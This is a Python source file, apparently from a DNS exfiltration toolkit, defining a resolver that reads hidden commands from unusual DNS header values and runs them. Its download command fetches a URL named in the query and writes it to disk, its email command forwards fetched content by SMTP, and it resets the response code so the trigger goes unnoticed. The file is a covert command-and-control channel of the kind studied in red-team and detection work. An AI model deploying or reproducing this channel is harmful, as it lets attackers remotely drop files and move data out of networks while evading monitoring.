from dns_exfil.exfiltrators.base.server import FullRequestPassthroughResolver
import dnslib

import requests
import smtplib
from os.path import basename
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


class HeaderExecuter(FullRequestPassthroughResolver):
    def __init__(self):
        super().__init__()
    def should_process(self, request):
        for condition, match in self.context['header_conditions'].items():
            if getattr(request.header, condition) != match:
                return False
        return True
        
    def process(self, request):
        '''
        This demonstrates how to make the server take action when it sees 
        a certain kind of condition. In this case, we just look at any packet
        where the opcode is 11. This is a reserved opcode and would certainly
        be unusual from a request.
        '''
        if self.should_process(request):
            id_process_map = self.context['command_map']
            processor = getattr(self, id_process_map[request.header.id])
            processor(request)
            # Our condition is that rcode is 11. Don't be weird when
            # proxying the request back to another server.
            request.header.rcode = 0
        return request
    def download(self, request):
        response = requests.get('http://' + str(request.q.qname), verify=False)
        if response.status_code == 200:
            with open('/'.join([self.context['basedir'], self.context['download_to']]), 'w') as f:
                f.write(response.text)
    def email(self, request):
        response = requests.get('http://' + str(request.q.qname), verify=False)
        if response.status_code == 200:
            you = self.context['email_to']
            me = self.context['email_from']
            msg = MIMEMultipart('alternative')
            msg['To'] = you
            msg['From'] = me
            msg['Subject'] = self.context['email_subject']
            msg.attach(MIMEText(response.text, 'html'))
            smtp = smtplib.SMTP(self.context['smtp_server'])
            smtp.sendmail(me, you, msg.as_string())
            smtp.quit()
        
    def hello(self, request):
        print('hello')
